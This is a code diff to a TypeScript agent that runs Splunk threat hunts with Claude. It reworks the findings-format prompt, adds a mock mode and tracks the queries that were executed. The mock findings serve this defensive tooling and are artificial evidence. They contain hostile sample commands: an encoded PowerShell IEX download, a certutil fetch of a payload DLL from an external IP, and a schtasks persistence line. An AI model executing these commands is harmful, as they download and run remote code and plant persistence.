@@ -17,26 +17,37 @@ When given a hunt:
 1. Read and understand the hunt's hypothesis and goals
 2. Execute the suggested SPL queries using the execute_splunk_query tool
 3. Analyze the results to identify suspicious activity
-4. Generate findings with appropriate severity and confidence based on what you actually discover
+4. Generate findings based on what you actually discover
 
-Guidelines for findings:
-- **Severity**: Assess dynamically based on the threat level
-  - CRITICAL: Active compromise, data exfiltration, ransomware
-  - HIGH: Privilege escalation, lateral movement, exploitation attempts
-  - MEDIUM: Suspicious activity, policy violations, misconfigurations
-  - LOW: Informational findings, best practice gaps
+When you are done investigating, respond with a JSON array of findings inside a \`\`\`json code block. Each finding MUST have exactly these fields:
 
-- **Confidence**: Base on the quality and quantity of evidence
-  - 90-100%: Multiple strong indicators, clear malicious intent
-  - 70-89%: Strong indicators but some ambiguity
-  - 50-69%: Suspicious patterns but could be benign
-  - Below 50%: Weak signals, likely false positives
+{
+  "id": "string - unique finding ID e.g. F001, F002",
+  "severity": "critical | high | medium | low",
+  "title": "string - concise finding title describing the threat",
+  "description": "string - detailed explanation of what was found and why it matters",
+  "affectedEntities": ["string array - hostnames, user accounts, IPs, or systems involved"],
+  "evidence": ["string array - top 5 most suspicious log entries, command lines, IPs, etc."],
+  "queries": ["string array - the exact SPL queries you executed to find this"],
+  "confidence": "number 0-100",
+  "recommendation": "string - specific, actionable remediation steps"
+}
 
-- **Evidence**: Extract the most suspicious command lines, IPs, user accounts, etc. (top 5)
-- **Affected Entities**: List unique hostnames, user accounts, or systems involved
-- **Recommendation**: Provide specific, actionable remediation steps based on what you found
+Severity guidelines:
+- critical: Active compromise, data exfiltration, ransomware
+- high: Privilege escalation, lateral movement, exploitation attempts
+- medium: Suspicious activity, policy violations, misconfigurations
+- low: Informational findings, best practice gaps
 
-If no suspicious activity is found, return an empty findings array. Only create findings when there is actual evidence of security concerns.`;
+Confidence guidelines:
+- 90-100: Multiple strong indicators, clear malicious intent
+- 70-89: Strong indicators but some ambiguity
+- 50-69: Suspicious patterns but could be benign
+- Below 50: Weak signals, likely false positives
+
+If no suspicious activity is found, return an empty JSON array: \`\`\`json\n[]\n\`\`\`
+
+IMPORTANT: Always respond with the JSON code block. Every finding must include all fields. The queries field must contain the actual SPL queries you ran.`;
 
 const EXECUTE_QUERY_TOOL: Anthropic.Tool = {
   name: "execute_splunk_query",
@@ -57,6 +68,88 @@ const EXECUTE_QUERY_TOOL: Anthropic.Tool = {
   }
 };
 
+const MOCK_FINDINGS: Finding[] = [
+  {
+    id: "F001",
+    severity: "high",
+    title: "Suspicious PowerShell Encoded Command Execution",
+    description: "Multiple hosts executed PowerShell with Base64-encoded commands, a common technique used by attackers to obfuscate malicious payloads. The encoded commands were found to download and execute remote scripts from external IP addresses.",
+    affectedEntities: ["WORKSTATION-PC12", "SVR-APP-03", "10.0.1.45"],
+    evidence: [
+      "powershell.exe -EncodedCommand SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAA=",
+      "Parent process: cmd.exe /c echo IEX | powershell -nop -",
+      "Network connection to 185.220.101.34:443 immediately after execution",
+      "Event ID 4688 - Process creation with suspicious command line",
+      "Sysmon Event ID 1 - PowerShell spawned by WScript.exe"
+    ],
+    queries: [
+      'index=windows sourcetype=WinEventLog:Security EventCode=4688 CommandLine="*powershell*-enc*"',
+      'index=windows sourcetype=WinEventLog:Sysmon EventCode=1 Image="*powershell.exe" ParentImage="*wscript.exe"'
+    ],
+    confidence: 85,
+    evidenceCount: 5,
+    recommendation: "Immediately isolate affected hosts and perform forensic analysis. Block the external IP 185.220.101.34 at the firewall. Review PowerShell logging policies and enable Script Block Logging (Event ID 4104) across all endpoints."
+  },
+  {
+    id: "F002",
+    severity: "critical",
+    title: "LOLBin Abuse - Certutil Used for File Download",
+    description: "Certutil.exe, a legitimate Windows certificate utility, was used to download files from an external server. This is a well-known Living-off-the-Land (LOLBin) technique frequently used by threat actors to bypass application whitelisting and download malicious payloads.",
+    affectedEntities: ["SVR-APP-03", "ADMIN-PC01", "svc_backup"],
+    evidence: [
+      "certutil.exe -urlcache -split -f http://45.33.32.156/payload.dll C:\\Users\\Public\\update.dll",
+      "Execution under svc_backup account (service account misuse)",
+      "File C:\\Users\\Public\\update.dll created 2 minutes after certutil execution",
+      "Subsequent rundll32.exe execution loading the downloaded DLL",
+      "DNS query for 45.33.32.156 from SVR-APP-03 at 03:14 UTC"
+    ],
+    queries: [
+      'index=windows sourcetype=WinEventLog:Sysmon EventCode=1 Image="*certutil.exe" CommandLine="*urlcache*"',
+      'index=windows sourcetype=WinEventLog:Sysmon EventCode=11 TargetFilename="C:\\Users\\Public\\*"',
+      'index=network sourcetype=stream:dns query="45.33.32.156"'
+    ],
+    confidence: 92,
+    evidenceCount: 5,
+    recommendation: "Immediately contain SVR-APP-03 and ADMIN-PC01. Reset svc_backup account credentials. Block 45.33.32.156 at network perimeter. Analyze the downloaded DLL for malware indicators. Audit all service account usage and restrict certutil execution via AppLocker policies."
+  },
+  {
+    id: "F003",
+    severity: "medium",
+    title: "Unusual Scheduled Task Creation for Persistence",
+    description: "A scheduled task was created on multiple endpoints using schtasks.exe with execution parameters that suggest an attempt to establish persistence. The tasks are configured to run at system startup under SYSTEM privileges.",
+    affectedEntities: ["WORKSTATION-PC12", "WORKSTATION-PC08"],
+    evidence: [
+      'schtasks /create /tn "WindowsUpdateCheck" /tr "C:\\ProgramData\\svchost.exe" /sc onstart /ru SYSTEM',
+      "Suspicious binary path: C:\\ProgramData\\svchost.exe (legitimate svchost.exe resides in System32)",
+      "Event ID 4698 - Scheduled task created by non-admin user"
+    ],
+    queries: [
+      'index=windows sourcetype=WinEventLog:Security EventCode=4698 TaskContent="*ProgramData*"',
+      'index=windows sourcetype=WinEventLog:Sysmon EventCode=1 Image="*schtasks.exe" CommandLine="*/create*"'
+    ],
+    confidence: 74,
+    evidenceCount: 3,
+    recommendation: "Review and remove the suspicious scheduled task 'WindowsUpdateCheck'. Investigate the binary at C:\\ProgramData\\svchost.exe. Implement scheduled task creation monitoring and restrict schtasks.exe usage to administrators via Group Policy."
+  },
+  {
+    id: "F004",
+    severity: "low",
+    title: "Excessive Failed Login Attempts Detected",
+    description: "Multiple accounts experienced a high volume of failed login attempts from internal IP addresses, potentially indicating password spraying or brute force activity. While this could be benign (e.g., misconfigured service accounts), it warrants investigation.",
+    affectedEntities: ["DC-01", "10.0.0.5", "jsmith", "admin_temp"],
+    evidence: [
+      "47 failed logon events (Event ID 4625) for admin_temp in 5 minutes",
+      "Source IP 10.0.0.5 targeting DC-01 with multiple usernames"
+    ],
+    queries: [
+      'index=windows sourcetype=WinEventLog:Security EventCode=4625 | stats count by Account_Name, Source_Network_Address | where count > 20'
+    ],
+    confidence: 58,
+    evidenceCount: 2,
+    recommendation: "Verify whether admin_temp is a legitimate account. Implement account lockout policies. Investigate 10.0.0.5 to determine if it is compromised. Consider deploying multi-factor authentication for all privileged accounts."
+  }
+];
+
 /**
  * Execute a hunt using Claude as an autonomous threat hunting agent
  */
@@ -64,6 +157,13 @@ export async function executeHunt(
   hunt: Hunt,
   executorConfig: HuntExecutorConfig
 ): Promise<Finding[]> {
+  if (config.mockMode) {
+    console.log(`[Hunt Executor] MOCK MODE - Returning dummy findings for hunt: ${hunt.id}`);
+    // Simulate processing delay
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    return MOCK_FINDINGS.map(f => ({ ...f, id: `${hunt.id}-${f.id}` }));
+  }
+
   if (!config.anthropicApiKey) {
     throw new Error("ANTHROPIC_API_KEY not configured");
   }
@@ -110,6 +210,7 @@ export async function executeHunt(
     let continueLoop = true;
     let maxIterations = 10; // Prevent infinite loops
     let iterations = 0;
+    const executedQueries: string[] = [];
 
     // Agentic loop - let Claude decide when it's done
     while (continueLoop && iterations < maxIterations) {
@@ -142,6 +243,7 @@ export async function executeHunt(
 
             console.log(`[Hunt Executor] Executing query: ${input.description}`);
             console.log(`[Hunt Executor] SPL: ${input.spl.substring(0, 100)}...`);
+            executedQueries.push(input.spl);
 
             try {
               // Try different argument strategies for the query tool
@@ -189,7 +291,7 @@ export async function executeHunt(
         // Claude is done - extract findings from final response
         for (const block of response.content) {
           if (block.type === "text") {
-            findings = extractFindingsFromText(block.text, hunt);
+            findings = extractFindingsFromText(block.text, hunt, executedQueries);
           }
         }
         continueLoop = false;
@@ -211,7 +313,7 @@ export async function executeHunt(
  * Extract Finding objects from Claude's text response
  * Looks for JSON-formatted findings in the response
  */
-function extractFindingsFromText(text: string, hunt: Hunt): Finding[] {
+function extractFindingsFromText(text: string, hunt: Hunt, executedQueries: string[]): Finding[] {
   try {
     // Look for JSON array of findings in the response
     const jsonMatch = text.match(/```json\s*([\s\S]*?)\s*```/) ||
@@ -222,18 +324,24 @@ function extractFindingsFromText(text: string, hunt: Hunt): Finding[] {
       const parsed = JSON.parse(jsonText);
 
       if (Array.isArray(parsed)) {
-        return parsed.map((f) => ({
-          id: f.id || `${hunt.id}-${Date.now()}`,
-          severity: f.severity || "medium",
-          title: f.title || hunt.id,
-          affectedEntities: f.affectedEntities || [],
-          evidenceCount: f.evidence?.length || 0,
-          confidence: f.confidence || 50,
-          description: f.description || "",
-          evidence: f.evidence || [],
-          queries: f.queries || [],
-          recommendation: f.recommendation || ""
-        }));
+        return parsed.map((f, idx) => {
+          const evidence = Array.isArray(f.evidence) ? f.evidence : [];
+          const queries = Array.isArray(f.queries) && f.queries.length > 0
+            ? f.queries
+            : executedQueries;
+          return {
+            id: f.id || `${hunt.id}-F${String(idx + 1).padStart(3, "0")}`,
+            severity: f.severity || "medium",
+            title: f.title || "Untitled Finding",
+            description: f.description || "",
+            affectedEntities: Array.isArray(f.affectedEntities) ? f.affectedEntities : [],
+            evidence,
+            evidenceCount: evidence.length,
+            confidence: typeof f.confidence === "number" ? f.confidence : 50,
+            queries,
+            recommendation: f.recommendation || ""
+          };
+        });
       }
     }
 
@@ -241,6 +349,7 @@ function extractFindingsFromText(text: string, hunt: Hunt): Finding[] {
     return [];
   } catch (err) {
     console.error("[Hunt Executor] Failed to parse findings from response:", err);
+    console.error("[Hunt Executor] Raw text:", text.substring(0, 500));
     return [];
   }
 }
